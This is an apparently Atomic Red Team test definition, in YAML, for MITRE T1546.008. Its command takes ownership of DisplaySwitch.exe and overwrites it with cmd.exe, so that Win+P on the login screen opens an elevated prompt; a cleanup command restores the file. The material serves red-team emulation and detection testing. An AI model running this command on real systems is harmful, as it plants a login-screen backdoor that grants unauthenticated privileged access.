- id: 825ba8ca-71cc-436b-b1dd-ea0d5e109086
  name: Replace DisplaySwitch.exe (Display Switcher binary) with cmd.exe
  description: Replace DisplaySwitch.exe (Display Switcher binary) with cmd.exe. This
    allows the user to launch an elevated command prompt by pressing the Windows Key
    + P on the login screen.
  tactic: privilege-escalation
  technique:
    attack_id: T1546.008
    name: 'Event Triggered Execution: Accessibility Features'
  platforms:
    windows:
      sh:
        command: IF NOT EXIST C:\Windows\System32\DisplaySwitch_backup.exe (copy C:\Windows\System32\DisplaySwitch.exe
          C:\Windows\System32\DisplaySwitch_backup.exe) ELSE ( pushd ); takeown /F
          C:\Windows\System32\DisplaySwitch.exe /A; icacls C:\Windows\System32\DisplaySwitch.exe
          /grant Administrators:F /t; copy /Y C:\Windows\System32\cmd.exe C:\Windows\System32\DisplaySwitch.exe
        cleanup: copy /Y C:\Windows\System32\DisplaySwitch_backup.exe C:\Windows\System32\DisplaySwitch.exe
        elevation_required: true
  plugin: atomic
  singleton: false
  repeatable: true
  delete_payload: false
  privilege: ''
  buckets:
  - atomic-red-team
  - t1546.008
  - privilege-escalation
  author: Atomic Red Team
  additional_info:
    technique_created: '2020-01-24T14:32:40.315Z'
    atomic_guid: 825ba8ca-71cc-436b-b1dd-ea0d5e109086
    import_timestamp: '2025-09-05T03:00:13.765209Z'
